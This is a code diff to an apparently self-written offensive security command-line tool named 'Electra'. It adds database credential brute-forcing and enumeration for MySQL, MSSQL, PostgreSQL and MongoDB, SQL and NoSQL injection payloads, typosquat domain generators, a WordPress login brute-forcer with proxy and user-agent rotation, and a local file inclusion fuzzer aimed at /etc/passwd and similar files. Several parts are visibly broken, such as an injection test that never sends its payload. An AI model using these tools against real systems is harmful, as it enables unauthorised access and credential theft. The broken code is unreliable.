@@ -2,8 +2,10 @@
 #import pymongo.errors
 import dns.resolver
 import concurrent.futures
-import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64, pysip, boto3, re, json, random
+import pymongo.errors
+import click, sys, os, socket, requests, platform, psutil, subprocess, hashlib, bcrypt, paramiko, ftplib, time, poplib, imaplib, vncdotool, pymysql, pymongo, psycopg2, ldap3, ssl, itertools, pyshark, base64, pysip, boto3, re, json, random, pymssql, threading
 #import telnetlib (Deprecated in python 3.13)
+#import ssdeep
 import requests.auth
 from smbprotocol.connection import Connection
 from smbprotocol.session import Session
@@ -27,6 +29,8 @@ from cryptography.hazmat.primitives.serialization import load_pem_private_key
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
 from OpenSSL import crypto
+from concurrent.futures import as_completed
+from tqdm import tqdm
 
 BANNER = """
 ███████╗██╗     ███████╗ ██████╗████████╗██████╗  █████╗ 
@@ -34,7 +38,7 @@ BANNER = """
 █████╗  ██║     █████╗  ██║        ██║   █████╔╝ ███████║
 ██╔══╝  ██║     ██╔══╝  ██║        ██║   ██  ██╗ ██╔══██║
 ███████╗███████╗███████╗╚██████╗   ██║   ██║  ██╗██║  ██║
-═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.5
+═══════╝╚══════╝╚══════╝ ╚═════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ v1.6
 
 Electra - The master plan plotter.
 """
@@ -74,7 +78,12 @@ class BannerGroup(click.Group):
             ("xsscan", "Scan for XSS vulnerabilities."),
             ("cryptaudit", "Assess cryptographic implementations."),
             ("csrf", "Scan for CSRF vulnerabilities."),
-            ("ssrf", "Scan for SSRF vulnerabilities.")
+            ("ssrf", "Scan for SSRF vulnerabilities."),
+            ("dbscan", "Assess database vulnerabilities."),
+            ("dnskit", "Generate domain names. Perform DNS queries. Estimate webpage similarity."),
+            #("dnskit2", "Similar to dnskit.") Easter egg?
+            ("wpscan", "Scan wordpress websites."),
+            ("lfi", "Perform Local File Inclusion vulnerability checks.")
         ]
         with formatter.section("Commands"):
             for cmd, desc in commands:
@@ -2117,6 +2126,718 @@ def ssrf(url, param, header, proxy):
             click.echo(click.style(f"[!] Request failed: {e}", fg="red"))
     
     click.echo(click.style("\n[*] SSRF scan completed.", fg="blue"))
+
+#DBSCAN COMMAND - PYMSSQL Dependency for requirements.txt
+@cli.command()
+@click.option("-t", "--target", required=True, help="Target DB server (IP, Domain or Host).")
+@click.option("-p", "--port", default=None, help="Port of DB server. Default = Auto-Detect")
+@click.option("-d", "--db", required=True, type=click.Choice(["mysql", "mssql", "postgresql", "mongodb"], case_sensitive=False), help="DB type (mysql, mssql, mongodb, etc).")
+@click.option("-u", "--username", default=None, help="Username for authentication (if used).")
+@click.option("-w", "--wordlist", default=None, help="Path to wordlist for Brute-Forcing.")
+def dbscan(target, port, db, username, wordlist):
+    click.echo(click.style(f"[*] Scanning {db.upper()} on {target} ...", fg="blue"))
+    #Set default ports if not given
+    db_ports = {"mysql": 3306, "mssql": 1433, "postgresql": 5432, "mongodb": 27017}
+    port = int(port) if port else db_ports[db.lower()]
+
+    click.echo(click.style(f"[*] Checking if {target}:{port} is reachable ...", fg="blue"))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.settimeout(3)
+    #result = s.connect_ex((target, int(port)))
+    #if result != 0:
+    #    click.echo(click.style("[!] DB port is closed or unreachable.", fg="red"))
+    #    return
+    if s.connect_ex((target, int(port))) != 0:
+        click.echo(click.style("[!] DB port is closed or unreachable.", fg="red"))
+        return
+    s.close()
+    click.echo(click.style(f"[!] DB port is open.", fg="green"))
+
+    #Perform DB checks
+    db = db.lower()
+    if db == "mysql":
+        scan_mysql(target, port, username, wordlist)
+    elif db == "mssql":
+        scan_mssql(target, port, username, wordlist)
+    elif db == "postgresql":
+        scan_postgresql(target, port, username, wordlist)
+    elif db == "mongodb":
+        scan_mongodb(target, port, username, wordlist)
+
+#MySQL
+def scan_mysql(target, port, username, wordlist):
+    click.echo(click.style("[*] Performing MySQL vulnerability assessment ...", fg="blue"))
+    #Authentication without password
+    try:
+        conn = pymysql.connect(host=target, port=int(port), user=username if username else "root", password="", connect_timeout=3)
+        click.echo(click.style("[!] Connected to MySQL DB. No password required.", fg="green"))
+        cursor = conn.cursor()
+        cursor.execute("SELECT VERSION();")
+        version = cursor.fetchone()[0]
+        click.echo(click.style(f"[!] MySQL version: {version}", fg="green"))
+        enum_mysql_priv(conn)
+        conn.close()
+    except pymysql.err.OperationalError as e:
+        if "Access denied" in str(e):
+            click.echo(click.style("[!] Could not connect to MySQL DB. Authentication required.", fg="red"))
+        else:
+            click.echo(click.style(f"[!] Error: {e}", fg="red"))
+    
+    #Authentication with passwords using wordlist (Brute Force)
+    if wordlist:
+        bf_mysql(target, port, username, wordlist)
+
+def enum_mysql_priv(conn):
+    try:
+        with conn.cursor() as cursor:
+            cursor.execute("SELECT user, host FROM mysql.user;")
+            users = cursor.fetchall()
+            click.echo(click.style("[!] MySQL users:", fg="green"))
+            for user in users:
+                click.echo(click.style(f" - {user}", fg="green"))
+            cursor.execute("SHOW GRANTS FOR CURRENT_USER;")
+            privileges = cursor.fetchall()
+            click.echo(click.style("[!] User privileges:", fg="green"))
+            for priv in privileges:
+                click.echo(click.style(f" - {priv}", fg="green"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error retrieving MySQL privileges. {e}", fg="red"))
+
+def bf_mysql(target, port, username, wordlist):
+    click.echo(click.style("[*] Starting MySQL brute-force attack ...", fg="blue"))
+    try:
+        with open(wordlist, "r", encoding="utf-8") as passwords:
+            for password in passwords:
+                password = password.strip()
+                try:
+                    conn = pymysql.connect(host=target, port=int(port), user=username, password=password, connect_timeout=2)
+                    click.echo(click.style(f"[!] Credentials found. Username: {username}, Password: {password}", fg="green"))
+                    conn.close()
+                    return
+                except pymysql.err.OperationalError:
+                    continue
+        click.echo(click.style("[!] No credentials found.", fg="red"))
+    except FileNotFoundError:
+        click.echo(click.style("[!] Wordlist not found.", fg="red"))
+
+#MSSQL
+def scan_mssql(target, port, username, wordlist):
+    click.echo(click.style("[*] Performing MSSQL vulnerability assessment ...", fg="blue"))
+    #Authentication without password
+    try:
+        conn = pymssql.connect(server=target, port=int(port), user=username if username else "sa", password="", login_timeout=3)
+        click.echo(click.style("[!] Connected to MSSQL DB. No password required.", fg="green"))
+        cursor = conn.cursor()
+        cursor.execute("SELECT @@VERSION;")
+        version = cursor.fetchone()[0]
+        click.echo(click.style(f"[!] MSSQL version: {version}", fg="green"))
+        enum_mssql_priv(conn)
+        conn.close()
+    except pymssql.OperationalError as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+    
+    #Authentication with passwords using wordlist (Brute Force)
+    if wordlist:
+        bf_mssql(target, port, username, wordlist)
+
+def enum_mssql_priv(conn):
+    try:
+        with conn.cursor() as cursor:
+            cursor.execute("SELECT name FROM syslogins;")
+            users = cursor.fetchall()
+            click.echo(click.style("[!] MSSQL users:", fg="green"))
+            for user in users:
+                click.echo(click.style(f" - {user}", fg="green"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error retrieving MSSQL privileges. {e}", fg="red"))
+
+def bf_mssql(target, port, username, wordlist):
+    click.echo(click.style("[*] Starting MSSQL brute-force attack ...", fg="blue"))
+    try:
+        with open(wordlist, "r", encoding="utf-8") as passwords:
+            for password in passwords:
+                password = password.strip()
+                try:
+                    conn = pymssql.connect(server=target, port=int(port), user=username, password=password, login_timeout=2)
+                    click.echo(click.style(f"[!] Credentials found. Username: {username}, Password: {password}", fg="green"))
+                    conn.close()
+                    return
+                except pymssql.OperationalError:
+                    continue
+        click.echo(click.style("[!] No credentials found.", fg="red"))
+    except FileNotFoundError:
+        click.echo(click.style("[!] Wordlist not found.", fg="red"))
+
+#PostgreSQL
+def scan_postgresql(target, port, username, wordlist):
+    click.echo(click.style("[*] Performing PostgreSQL vulnerability assessment ...", fg="blue"))
+    #Authentication without password
+    try:
+        conn = psycopg2.connect(host=target, port=int(port), user=username if username else "postgres", password="", connect_timeout=3)
+        click.echo(click.style("[!] Connected to PostgreSQL. No password required.", fg="green"))
+        cursor = conn.cursor()
+        cursor.execute("SELECT version();")
+        version = cursor.fetchone()[0]
+        click.echo(click.style(f"[!] PostgreSQL version: {version}", fg="green"))
+        enum_postgresql_priv(conn)
+        conn.close()
+    except psycopg2.OperationalError as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+    
+    #Authentication with passwords using wordlist (Brute Force)
+    if wordlist:
+        bf_postgresql(target, port, username, wordlist)
+
+def enum_postgresql_priv(conn):
+    try:
+        with conn.cursor() as cursor:
+            cursor.execute("SELECT rolname FROM pg_roles;")
+            roles = cursor.fetchall()
+            click.echo(click.style("[!] PostgreSQL roles:", fg="green"))
+            for role in roles:
+                click.echo(click.style(f" - {role}", fg="green"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error retrieving PostgreSQL privileges. {e}", fg="red"))
+
+def bf_postgresql(target, port, username, wordlist):
+    click.echo(click.style("[*] Starting PostgreSQL brute-force attack ...", fg="blue"))
+    try:
+        with open(wordlist, "r", encoding="utf-8") as passwords:
+            for password in passwords:
+                password = password.strip()
+                try:
+                    conn = psycopg2.connect(host=target, port=int(port), user=username, password=password, connect_timeout=2)
+                    click.echo(click.style(f"[!] Found credentials. Username: {username}, Password: {password}", fg="green"))
+                    conn.close()
+                    return
+                except psycopg2.OperationalError:
+                    continue
+        click.echo(click.style("[!] No credentials found.", fg="red"))
+    except FileNotFoundError:
+        click.echo(click.style("[!] Wordlist not found.", fg="red"))
+
+#MongoDB
+def scan_mongodb(target, port, username, wordlist):
+    click.echo(click.style("[*] Performing MongoDB vulnerability assessment ...", fg="blue"))
+    try:
+        client = pymongo.MongoClient(f"mongodb://{target}:{port}/", serverSelectionTimeoutMS=3000)
+        info = client.server_info()
+        click.echo(click.style("[!] Connected to MongoDB. No authentication required.", fg="green"))
+        click.echo(click.style(f"[!] MongoDB version: {info['version']}", fg="green"))
+        enum_mongodb_priv(client)
+    except pymongo.errors.ServerSelectionTimeoutError:
+        click.echo(click.style("[!] Could not connect to MongoDB. Authentication required.", fg="red"))
+    
+    if username and wordlist:
+        bf_mongodb(target, port, username, wordlist)
+
+def enum_mongodb_priv(client):
+    try:
+        users = client.admin.command("usersInfo")
+        click.echo(click.style("[!] MongoDB users:", fg="green"))
+        for user in users["users"]:
+            click.echo(click.style(f" - {user['user']}: {user['roles']}", fg="green"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error retrieving MongoDB privileges. {e}", fg="red"))
+
+def bf_mongodb(target, port, username, wordlist):
+    click.echo(click.style("[*] Starting MongoDB brute-force attack ...", fg="blue"))
+    try:
+        with open(wordlist, "r", encoding="utf-8") as passwords:
+            for password in passwords:
+                password = password.strip()
+                try:
+                    client = pymongo.MongoClient(f"mongodb://{username}:{password}@{target}:{port}/", serverSelectionTimeoutMS=2000)
+                    client.server_info()
+                    click.echo(click.style(f"[!] Found credentials. Username: {username}, Password: {password}", fg="green"))
+                    return
+                except pymongo.errors.OperationFailure:
+                    continue
+        click.echo(click.style("[!] No credentials found.", fg="red"))
+    except FileNotFoundError:
+        click.echo(click.style("[!] Wordlist not found.", fg="red"))
+
+#SQL Injections
+def sql_inj(target, port, db, username):
+    click.echo(click.style("[*] Testing for SQL injections ...", fg="blue"))
+
+    injection_payloads = {
+        "mysql": "' OR '1'='1' -- ",
+        "mssql": "' OR 1=1; -- ",
+        "postgresql": "'UNION SELECT null, null -- "
+    }
+    time_based_payloads = {
+        "mysql": "' OR SLEEP(5) -- ",
+        "mssql": "' WAITFOR DELAY '00:00:05' -- ",
+        "postgresql": "' OR pg_sleep(5) -- "
+    }
+
+    if db in injection_payloads:
+        payload = injection_payloads[db]
+        click.echo(click.style(f"[*] Testing error-based SQL injection on {db} ...", fg="blue"))
+        try:
+            conn = attempt_conn(target, port, db, username, payload)
+            if conn:
+                click.echo(click.style("[!] Detected possible SQL injection.", fg="green"))
+                conn.close()
+        except Exception as e:
+            click.echo(click.style("[!] No SQL injection detected.", fg="red"))
+    
+    if db in time_based_payloads:
+        payload = time_based_payloads[db]
+        click.echo(click.style(f"[*] Testing time-based SQL injection on {db} ...", fg="blue"))
+        start_time = time.time()
+        try:
+            conn = attempt_conn(target, port, db, username, payload)
+            elapsed_time = time.time() - start_time
+            if elapsed_time > 4:
+                click.echo(click.style("[!] Detected possible time-based SQL injection.", fg="green"))
+                conn.close()
+        except Exception as e:
+            click.echo(click.style("[!] No time-based SQL injection detected.", fg="red"))
+
+def attempt_conn(target, port, db, username, payload):
+    try:
+        if db == "mysql":
+            conn = pymysql.connect(host=target, port=int(port), user="root", password="", connect_timeout=3)
+            return
+        elif db == "mssql":
+            conn = pymssql.connect(server=target, port=int(port), user="sa", password="", login_timeout=3)
+            return
+        elif db == "postgresql":
+            conn = psycopg2.connect(host=target, port=int(port), user="postgres", password="", connect_timeout=3)
+            return
+    except Exception as e:
+        click.echo(click.style(f"[!] Connection failed.", fg="red"))
+
+def nosql_inj(target, port):
+    click.echo(click.style("[*] Testing for NoSQL injections ...", fg="blue"))
+
+    nosql_payloads = [
+        {"username": {"$ne": None}, "password": "wrongpass"},
+        {"$where": "1 == 1"}
+    ]
+    for payload in nosql_payloads:
+        try:
+            client = pymongo.MongoClient(f"mongodb://{target}:{port}/", serverSelectionTimeoutMS=3000)
+            db = client.test
+            response = db.users.find_one(payload)
+            if response:
+                click.echo(click.style("[!] Detected possible NoSQL injection.", fg="green"))
+            else:
+                click.echo(click.style("[!] No NoSQL injection detected.", fg="red"))
+        except Exception as e:
+            click.echo(click.style(f"[!] Error testing NoSQL injection. {e}", fg="red"))
+
+#DNSKIT COMMAND - ssdeep library dependency (On windows we must first download the precompiled libraries. On linux we can install it by: BUILD_LIB=1 pip install ssdeep)
+#UNDER DEVELOPMENT
+@cli.command()
+@click.argument("domain")
+@click.option("-t", "--typosquat", is_flag=True, help="Generate typo-squatted domain names.")
+@click.option("-s", "--similarity", is_flag=True, help="Check webpage similarity using fuzzy hashing.")
+def dnskit(domain, typosquat, similarity):
+    domains = [domain]
+    if typosquat:
+        domains.extend(gen_ts_domains(domain))
+    
+    results = {}
+    for d in domains:
+        results[d] = perform_dns_queries(d)
+    
+    if similarity:
+        reference_hash = fetch_ssdeep_hash(domain)
+        if reference_hash:
+            for d in domains:
+                if d != domain:
+                    compare_similarity(reference_hash, d)
+    
+    for d, res in results.items():
+        click.echo(click.style(f"[!] Results for {d}:", fg="green"))
+        for record, values in res.items():
+            if values:
+                click.echo(click.style(f"[!] {record}: {', '.join(values)}", fg="green"))
+            else:
+                click.echo(click.style("[!] No record found.", fg="red"))
+
+def gen_ts_domains(domain):
+    common_typos = []
+    for i in range(len(domain)):
+        typo = domain[:i] + domain[i+1:] #Char omission
+        common_typos.append(typo)
+    return list(set(common_typos))
+
+def perform_dns_queries(domain):
+    records = {"A": [], "AAAA": [], "NS": [], "MX": []}
+    for record_type in records.keys():
+        try:
+            answers = dns.resolver.resolve(domain, record_type)
+            records[record_type] = [answer.to_text() for answer in answers]
+        except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN, dns.resolver.Timeout):
+            records[record_type] = []
+    return records
+
+def fetch_ssdeep_hash(domain):
+    try:
+        response = requests.get(f"http://{domain}", timeout=5)
+        #return ssdeep.hash(response.text)
+    except requests.RequestException:
+        return None
+
+def compare_similarity(reference_hash, domain):
+    target_hash = fetch_ssdeep_hash(domain)
+    if target_hash:
+        #similarity_score = ssdeep.compare(reference_hash, target_hash)
+        #click.echo(click.style(f"[!] Similarity with {domain}: {similarity_score}%", fg="yellow"))
+        print()
+
+#DNSKIT2 COMMAND - UNDER DEVELOPMENT
+@cli.command()
+@click.option("-d", "--domain", required=True, help="Base domain to use.")
+@click.option("-m", "--mutation", default="basic", type=click.Choice(["basic", "all"]), help="Mutation strategy for domain generation.")
+def dnskit2(domain, mutation):
+    click.echo(click.style(f"[*] Generating domain variations for {domain} ...", fg="blue"))
+
+    if mutation == "basic":
+        domains = gen_variants(domain)
+    else:
+        domains = gen_variants(domain) + [domain + "xyz", "test" + domain] #Additional mutations
+    click.echo(click.style(f"[*] Checking {len(domains)} domains ...", fg="blue"))
+
+    for d in domains:
+        click.echo(click.style(f"[*] Checking {d} ...", fg="blue"))
+        dns_results = query_dns(d)
+
+        #Display DNS results
+        for record, values in dns_results.items():
+            if values:
+                click.echo(click.style(f"[!] {record} Record: {', '.join(values)}", fg="green"))
+        
+        #Check mail server misconfiguration
+        if dns_results["MX"]:
+            active_mail_server = check_mail_server(dns_results["MX"])
+            if active_mail_server:
+                click.echo(click.style(f"[!] {d} has an active mail server.", fg="green"))
+        
+        #Compare webpage similarity
+        base_fuzzy_hash = fuzzy_hash(domain)
+        current_fuzzy_hash = fuzzy_hash(d)
+        
+        if base_fuzzy_hash and current_fuzzy_hash:
+            #similarity = ssdeep.compare(base_fuzzy_hash, current_fuzzy_hash)
+            #click.echo(click.style(f"[!] Similarity score: {similarity}", fg="yellow"))
+            print()
+        
+        #click.echo("-" * 50)
+
+#Domain mutations
+def gen_variants(domain):
+    domain_parts = domain.split(".")
+    base = domain_parts[0]
+    tld = ".".join(domain_parts[1:]) if len(domain_parts) > 1 else "com"
+
+    mutations = [
+        base[::-1], #Reverse domain
+        base + "1", #Append numbers
+        base + "-", #Append hyphen
+        base[:-1], #Remove last char
+        base + base[-1], #Double last char
+        base.replace("o", "0").replace("i", "1").replace("e", "3") #Leetspeak
+    ]
+
+    random.shuffle(mutations) #Randomize results
+    return [f"{mut}.{tld}" for mut in mutations]
+
+#Perform DNS queries
+def query_dns(domain):
+    results = {"A": None, "AAAA": None, "NS": None, "MX": None}
+    try:
+        results["A"] = [r.address for r in dns.resolver.resolve(domain, "A")]
+    except:
+        pass
+    try:
+        results["AAAA"] = [r.address for r in dns.resolver.resolve(domain, "AAAA")]
+    except:
+        pass
+    try:
+        results["NS"] = [r.target.to.text() for r in dns.resolver.resolve(domain, "NS")]
+    except:
+        pass
+    try:
+        mx_records = dns.resolver.resolve(domain, "MX")
+        results["MX"] = [r.exchange.to_text() for r in mx_records]
+    except:
+        pass
+    #return results
+
+#Check MX record for active mail server
+def check_mail_server(mx_records):
+    for mx in mx_records:
+        try:
+            click.echo(click.style(f"[*] Checking mail server: {mx} ...", fg="blue"))
+            with socket.create_connection((mx, 25), timeout=3) as s:
+                banner = s.recv(1024).decode()
+                if "220" in banner:
+                    click.echo(click.style(f"[!] {mx} is an active mail server.", fg="green"))
+                    #return True
+        except Exception as e:
+            click.echo(click.style(f"[!] Error: {e}", fg="red"))
+    #return False
+
+#Fetch webpage and generate a fuzzy hash
+def fuzzy_hash(domain):
+    try:
+        response = requests.get(f"http://{domain}", timeout=5)
+        if response.status_code == 200:
+            #return ssdeep.hash(response.text)
+            print()
+    except Exception as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+
+#WPSCAN COMMAND - UNDER DEVELOPMENT
+DEFAULT_WP_CONFIG = {
+    "proxy_list": [],
+    "user_agents": [
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
+        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
+    ],
+    "random_delay_range": [1, 5],
+    "max_threads": 10,
+    "wordlist_path": "./passwords.txt"
+}
+
+WP_CONFIG_PATH = "./Wordpress/wp-config.json"
+
+#Generate default config file
+def gen_def_config():
+    if not os.path.exists(WP_CONFIG_PATH):
+        with open(WP_CONFIG_PATH, "w") as config_file:
+            json.dump(DEFAULT_WP_CONFIG, config_file, indent=4)
+        click.echo(click.style(f"[~] Seems like you did not provide a custom config file. Initiating Default Configuration file generation ...", fg="yellow"))
+        click.echo(click.style(f"[!] Default Configuration file successfully generated at {WP_CONFIG_PATH}", fg="green"))
+
+#Load configuration from config file
+def load_config_file():
+    if os.path.exists(WP_CONFIG_PATH):
+        with open(WP_CONFIG_PATH, "r") as config_file:
+            return json.load(config_file)
+    else:
+        gen_def_config()
+        return DEFAULT_WP_CONFIG
+
+#Simulate WP authentication for BF testing
+def attempt_wp_bf(target, username, password, proxies, agents, event):
+    #if event.is_set():
+    #    return False
+    
+    headers = {
+        "User-Agent": random.choice(agents) #Checkare edo, pros to paron randomly
+    }
+    data = {
+        "username": username,
+        "password": password
+    }
+
+    click.echo(click.style(f"[*] Initiating WP BF attack.", fg="blue"))
+    click.echo(click.style(f"[*] Trying {username}:{password} ...", fg="yellow"))
+    try:
+        if proxies:
+            proxy = random.choice(proxies) #Checkare edo, pros to paron randomly
+            response = requests.post(target, data=data, headers=headers, proxies={"http": proxy, "https": proxy})
+        else:
+            response = requests.post(target, data=data, headers=headers)
+        
+        if "Dashboard" in response.text:
+            click.echo(click.style(f"[!] Valid credentials found: {username}:{password}", fg="green"))
+            #event.set()
+            return True
+    except requests.RequestException as e:
+        click.echo(click.style(f"[!] Request for {username}:{password} failed. -> {str(e)}", fg="red"))
+    return False
+
+#Perform BF attack
+def wp_bf(target, usernames, wordlist, proxies, agents, threads, delay):
+    with open(wordlist, "r") as wordlist:
+        passwords = wordlist.readlines()
+    
+    #event = threading.Event()
+    with concurrent.futures.ThreadPoolExecutor(threads) as executor:
+        futures = []
+        for username in usernames:
+            for password in passwords:
+                #if event.is_set():
+                #    break
+                password = password.strip()
+                futures.append(executor.submit(attempt_wp_bf, target, username, password, proxies, agents))
+                time.sleep(random.uniform(delay[0], delay[1]))
+        
+        for future in futures:
+            if future.result():
+                break #Stop once valid credential found
+
+#Wordpress detection
+def det_wp(target):
+    try:
+        response = requests.get(f"{target}/wp-login.php", timeout=10)
+        if response.status_code == 200 and "wordpress" in response.text.lower():
+            click.echo(click.style("[!] WordPress detected (Found wp-login.php file).", fg="green"))
+            return True
+        else:
+            click.echo(click.style("[!] Could not confirm WordPress presence (via wp-login.php file).", fg="yellow"))
+            return False
+    except requests.RequestException as e:
+        click.echo(click.style(f"[!] Error during detection of WordPress. -> {e}", fg="red"))
+        return False
+
+#WP version enum
+def enum_wp_version(target):
+    try:
+        response = requests.get(f"{target}", timeout=10)
+        match = re.search(r'<meta name="generator" content="WordPress (\d+\.\d+(\.\d+)?)"', response.text, re.IGNORECASE)
+        if match:
+            version = match.group(1)
+            click.echo(click.style(f"[!] WordPress version: {version}", fg="green"))
+            return version
+        else:
+            click.echo(click.style(f"[!] WordPress version not found in meta tags.", fg="red"))
+    except requests.RequestException as e:
+        click.echo(click.style(f"[!] Error enumerating version. -> {e}", fg="red"))
+    return None
+
+@cli.command()
+@click.option("-t", "--target", required=True, help="Wordpress webpage of the target.")
+@click.option("-u", "--userlist", type=click.Path(exists=True), required=True, help="Path to user list file.")
+@click.option("-b", "--bf", is_flag=True, help="Enable brute-forcing.")
+@click.option("-s", "--scan", is_flag=True, help="Enable scanning.")
+@click.option("-c", "--config", default=WP_CONFIG_PATH, help="Path to config file.")
+@click.option("-T", "--threads", default=None, type=int, help="Number of threads for Brute-Forcing (Max = 10).")
+@click.option("-d", "--delay", default=None, type=int, help="Randomized delay between requests.")
+def wpscan(target, userlist, bf, scan, config, threads, delay):
+    config_data = load_config_file()
+
+    #If provided, override config file with given arguments
+    if threads is not None:
+        config_data["max_threads"] = threads
+    if delay is not None:
+        config_data["random_delay_range"] = [delay, delay]
+    
+    with open(userlist, "r") as file:
+        usernames = [line.strip() for line in file.readlines()]
+    
+    #Detect WP
+    if scan:
+        if not det_wp(target):
+            click.echo(click.style(f"[!] Exiting scan. Target does not appear to be running WordPress.", fg="red"))
+            return
+        #Enum version
+        enum_wp_version(target)
+    
+    #Perform BF
+    if bf:
+        wp_bf(target, usernames, config_data["wordlist_path"], config_data["proxy_list"], config_data["user_agents"], config_data["max_threads"], config_data["random_delay_range"])
+
+#LFI COMMAND - New dependencies: threading, tqdm - WARNING: USING -A, CTRL + C NEEDS SOME TIME TO FUNCTION-REGISTER. - Needs work.
+last_request_time = 0
+request_lock = threading.Lock()
+
+@cli.command()
+@click.option("-u", "--url", required=True, help="Target URL for injection using the 'FUZZ' placeholder.")
+@click.option("-w", "--wordlist", required=True, type=click.Path(exists=True), help="File containing LFI payloads.")
+@click.option("-a", "--agent", default="Electra-LFI/1.0", help="Custom User-Agent string.")
+@click.option("-d", "--delay", default=0.2, type=float, help="Delay between requests (in seconds).")
+@click.option("-N", "--nullbyte", is_flag=True, help="Append null byte (%00) to payloads.")
+@click.option("-A", "--autodepth", is_flag=True, help="Automatically test for directory traversal depth.")
+@click.option("-D", "--maxdepth", default=10, help="Maximum traversal depth to try (Default: 10).")
+@click.option("-E", "--appendext", default="php", help="Comma-seperated extensions to append to each payload, e.g. txt,log. (Default = php)")
+@click.option("-t", "--threads", default=10, help="Number of concurrent threads.")
+def lfi(url, wordlist, agent, delay, nullbyte, autodepth, maxdepth, appendext, threads):
+    click.echo(click.style(f"[*] Starting LFI scan on: {url} ...", fg="blue"))
+    headers = {"User-Agent": agent}
+
+    lfi_nonwordlist_payloads, lfi_wordlist_payloads = gen_payloads(wordlist, nullbyte, autodepth, maxdepth, appendext)
+    if not lfi_nonwordlist_payloads and not lfi_wordlist_payloads:
+        click.echo(click.style("[!] No payloads generated.", fg="red"))
+        return
+    
+    payloads = lfi_nonwordlist_payloads if autodepth else lfi_wordlist_payloads
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(scan_lfi, payload, url, headers, delay) for payload in payloads]
+        for _ in tqdm(as_completed(futures), total=len(futures), desc="Scanning", ncols=80): #for _ in as_completed(futures)
+            pass
+    
+    click.echo(click.style("[*] LFI scan completed!", fg="blue"))
+
+def gen_payloads(wordlist, nullbyte, autodepth, maxdepth, appendext):
+    lfi_nonwordlist_payloads = []
+    lfi_wordlist_payloads = []
+
+    extensions = appendext.split(",") if appendext else []
+
+    if autodepth:
+        sensitive_files = [
+            "etc/passwd", "proc/self/environ", "windows/win.ini", "boot.ini", "system32/drivers/etc/hosts"
+        ]
+        for depth in range(1, maxdepth + 1):
+            traversal = "../" * depth
+            for sf in sensitive_files:
+                base = traversal + sf
+                variants = [base]
+
+                if nullbyte:
+                    variants.append(base + "%00")
+
+                for ext in extensions:
+                    variants.append(base + "." + ext)
+                    if nullbyte:
+                        variants.append(base + "%00." + ext)
+                lfi_nonwordlist_payloads.extend(variants)
+    elif wordlist:
+        try:
+            with open(wordlist, "r") as payloads:
+                for payload in payloads:
+                    base = payload.strip()
+                    variants = [base]
+
+                    if nullbyte:
+                        variants.append(base + "%00")
+                    
+                    for ext in extensions:
+                        variants.append(base + "." + ext)
+                        if nullbyte:
+                            variants.append(base + "%00." + ext)
+                    lfi_wordlist_payloads.extend(variants)
+        except Exception as e:
+            click.echo(click.style(f"[!] Error reading wordlist. -> {e}", fg="red"))
+            return []
+    return lfi_nonwordlist_payloads, lfi_wordlist_payloads
+
+def scan_lfi(payload, url, headers, delay):
+    global last_request_time
+    encoded_payload = urllib.parse.quote(payload, safe="/%") #Does not double-encode slashes or %00 - Use safe=":/%" in quote() for passing absolute paths
+    target_url = url.replace("FUZZ", encoded_payload)
+
+    with request_lock:
+        now = time.time()
+        wait = delay - (now - last_request_time)
+        if wait > 0:
+            time.sleep(wait)
+        last_request_time = time.time()
+
+    try:
+        response = requests.get(target_url, headers=headers, timeout=5)
+        if any(keyword in response.text.lower() for keyword in ["root:x", "bash", "/home/", "kernel", "[boot loader]"]):
+            click.echo(click.style(f"\n[!] Detected possible LFI: {target_url}", fg="green"))
+            with open("Electra-LFI-Results.txt", "a") as results:
+                results.write(f"{target_url}\n")
+        else:
+            click.echo(click.style(f"\n[!] No LFI detected at: {target_url}", fg="red"))
+        #time.sleep(delay)
+    except requests.RequestException as e:
+        click.echo(click.style(f"[!] Request failed for {target_url} -> {e}", fg="red"))
+    except Exception as e:
+        click.echo(click.style(f"[!] Error: {e}", fg="red"))
+    
+    #time.sleep(delay) #Intentionally spread thread load a bit more
 
 if __name__ == "__main__":
     cli()
